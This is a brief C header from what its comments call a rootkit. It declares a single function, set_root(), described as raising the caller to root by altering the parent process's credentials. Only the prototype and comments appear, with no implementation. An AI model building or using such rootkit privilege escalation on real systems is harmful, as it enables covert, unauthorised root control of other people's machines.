/**
 * @file privesc.h
 * 
 * @brief Definitions for privilege escalation
 * 
 * This file contains the definitions for privilege escalation. The rootkit can
 * be used to escalate privileges to gain root access to the system.
 */

#ifndef _RK_PRIVESC_H
#define _RK_PRIVESC_H


/**
 * @brief Set the current user to root
 * 
 * This function sets the current user to root by modifying the credentials of
 * the parent process.
 * 
 * @link https://github.com/torvalds/linux/blob/bf9aa14fc523d2763fc9a10672a709224e8fcaf4/include/linux/sched.h#L1028
 * 
 * @return 0 on success, -1 on failure
 */
int set_root(void);

#endif // _RK_PRIVESC_H